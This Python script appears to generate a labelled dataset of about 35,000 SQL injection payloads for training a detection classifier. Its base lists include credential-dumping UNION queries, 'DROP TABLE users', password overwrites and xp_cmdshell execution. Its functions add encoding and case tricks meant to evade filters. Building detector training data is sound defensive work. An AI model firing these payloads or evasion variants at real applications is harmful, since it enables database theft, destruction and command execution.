"""
SQL INJECTION PAYLOAD GENERATOR
Generate 35,000+ diverse SQL injection payloads

Based on OWASP patterns and common attack vectors
"""

import random
import itertools

# =============================================================================
# BASE PATTERNS
# =============================================================================

# Boolean-based patterns
BOOLEAN_PATTERNS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' OR '1'='1",
    "admin' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "') OR 1=1--",
    "1' OR '1' = '1",
    "1' OR 1 = 1",
]

# Union-based patterns
UNION_PATTERNS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "1' UNION SELECT NULL,table_name FROM information_schema.tables--",
    "1' UNION SELECT NULL,column_name FROM information_schema.columns--",
]

# Time-based patterns
TIME_PATTERNS = [
    "'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND pg_sleep(5)--",
    "'; SELECT SLEEP(5)--",
    "1'; WAITFOR DELAY '00:00:05'--",
    "1' AND BENCHMARK(5000000,MD5('A'))--",
]

# Error-based patterns
ERROR_PATTERNS = [
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=CAST((SELECT @@version) AS int)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
]

# Stacked queries
STACKED_PATTERNS = [
    "'; DROP TABLE users--",
    "1'; DROP TABLE users--",
    "'; EXEC xp_cmdshell('dir')--",
    "1'; INSERT INTO users VALUES('hacked','pass')--",
    "'; UPDATE users SET password='hacked'--",
]

# Comment-based
COMMENT_PATTERNS = [
    "admin'--",
    "admin'#",
    "admin'/*",
    "1'--",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
]

# =============================================================================
# OBFUSCATION TECHNIQUES
# =============================================================================

def add_whitespace_variations(payload):
    """Add various whitespace/comment obfuscations"""
    variations = []
    
    # Original
    variations.append(payload)
    
    # Space variations
    variations.append(payload.replace(' ', '/**/'))
    variations.append(payload.replace(' ', '%20'))
    variations.append(payload.replace(' ', '+'))
    variations.append(payload.replace(' ', '%09'))  # Tab
    
    # Case variations
    if random.random() > 0.5:
        variations.append(payload.upper())
        variations.append(payload.lower())
        # Random case
        varied = ''.join(c.upper() if random.random() > 0.5 else c.lower() 
                        for c in payload)
        variations.append(varied)
    
    return variations

def add_encoding_variations(payload):
    """Add encoding variations"""
    variations = []
    
    # URL encoding
    import urllib.parse
    variations.append(urllib.parse.quote(payload))
    variations.append(urllib.parse.quote(payload, safe=''))
    
    # Double encoding
    variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
    
    # Hex encoding (for some chars)
    hex_payload = payload.replace("'", "0x27")
    variations.append(hex_payload)
    
    return variations

def add_numeric_variations(payload):
    """Add numeric variations"""
    variations = [payload]
    
    # Replace numbers
    for old, new in [('1', '2'), ('1', '99'), ('5', '10')]:
        if old in payload:
            variations.append(payload.replace(old, new))
    
    return variations

# =============================================================================
# PAYLOAD GENERATOR
# =============================================================================

def generate_all_payloads(target_count=35000):
    """Generate target_count diverse payloads"""
    
    all_patterns = (
        BOOLEAN_PATTERNS + 
        UNION_PATTERNS + 
        TIME_PATTERNS + 
        ERROR_PATTERNS + 
        STACKED_PATTERNS + 
        COMMENT_PATTERNS
    )
    
    payloads = set()  # Use set to avoid duplicates
    
    print(f"Generating {target_count} payloads...")
    
    # Phase 1: Base payloads
    for pattern in all_patterns:
        payloads.add(pattern)
    
    print(f"Phase 1: Base patterns: {len(payloads)}")
    
    # Phase 2: Add variations
    base_payloads = list(payloads)
    for payload in base_payloads[:1000]:  # Limit to avoid too long
        # Whitespace variations
        payloads.update(add_whitespace_variations(payload))
        
        # Encoding variations
        payloads.update(add_encoding_variations(payload))
        
        # Numeric variations
        payloads.update(add_numeric_variations(payload))
        
        if len(payloads) >= target_count:
            break
    
    print(f"Phase 2: After variations: {len(payloads)}")
    
    # Phase 3: Combine patterns (Cartesian product)
    if len(payloads) < target_count:
        print("Phase 3: Combining patterns...")
        
        prefixes = ["1", "admin", "user", "test", ""]
        suffixes = ["--", "#", "/*", "", " AND 1=1"]
        
        for prefix, pattern, suffix in itertools.product(
            prefixes[:5], 
            all_patterns[:20], 
            suffixes[:5]
        ):
            combined = f"{prefix}{pattern}{suffix}"
            payloads.add(combined)
            
            if len(payloads) >= target_count:
                break
    
    print(f"Phase 3: After combinations: {len(payloads)}")
    
    # Phase 4: Add random mutations
    while len(payloads) < target_count:
        # Pick random base payload
        base = random.choice(list(payloads)[:1000])
        
        # Random mutation
        mutations = [
            base + str(random.randint(1, 999)),
            base.replace("'", '"'),
            base + " " + random.choice(["AND", "OR"]) + " 1=1",
            base + random.choice(["--", "#", "/*"]),
        ]
        
        payloads.update(mutations)
    
    print(f"Phase 4: After mutations: {len(payloads)}")
    
    return list(payloads)[:target_count]

# =============================================================================
# SAVE TO FILE
# =============================================================================

def save_payloads(payloads, filename="custom_sqli_payloads.txt"):
    """Save payloads to file"""
    with open(filename, 'w', encoding='utf-8') as f:
        for payload in payloads:
            f.write(payload + '\n')
    
    print(f"\n✅ Saved {len(payloads)} payloads to {filename}")

# =============================================================================
# CREATE LABELED DATASET
# =============================================================================

def create_labeled_dataset(payloads, output_csv="custom_sqli_dataset.csv"):
    """Create CSV with Sentence,Label columns"""
    import pandas as pd
    
    # All generated payloads are malicious
    df = pd.DataFrame({
        'Sentence': payloads,
        'Label': 1  # All malicious
    })
    
    df.to_csv(output_csv, index=False)
    print(f"✅ Created labeled dataset: {output_csv}")
    print(f"   Total malicious queries: {len(df)}")

# =============================================================================
# MAIN
# =============================================================================

if __name__ == "__main__":
    print("=" * 70)
    print("SQL INJECTION PAYLOAD GENERATOR")
    print("=" * 70)
    
    # Generate 35,000 payloads
    payloads = generate_all_payloads(target_count=35000)
    
    # Save to text file
    save_payloads(payloads, "data/custom_sqli_payloads.txt")
    
    # Create labeled CSV
    create_labeled_dataset(payloads, "data/custom_sqli_malicious.csv")
    
    print("\n" + "=" * 70)
    print("NEXT STEPS:")
    print("=" * 70)
    print("""
1. Generate benign queries (or use existing benign dataset)
2. Merge malicious + benign:
   
   import pandas as pd
   
   # Load
   malicious = pd.read_csv('custom_sqli_malicious.csv')
   benign = pd.read_csv('SQLiV3_cleaned.csv')
   benign = benign[benign['Label'] == 0]  # Keep only benign
   
   # Merge
   combined = pd.concat([malicious, benign], ignore_index=True)
   combined = combined.sample(frac=1, random_state=42)  # Shuffle
   
   # Save
   combined.to_csv('SQLiV3_FULL_65K.csv', index=False)
   
   print(f"Total: {len(combined)}")
   print(f"Malicious: {(combined['Label']==1).sum()}")
   print(f"Benign: {(combined['Label']==0).sum()}")

3. Re-run main_improved.py with new dataset!
    """)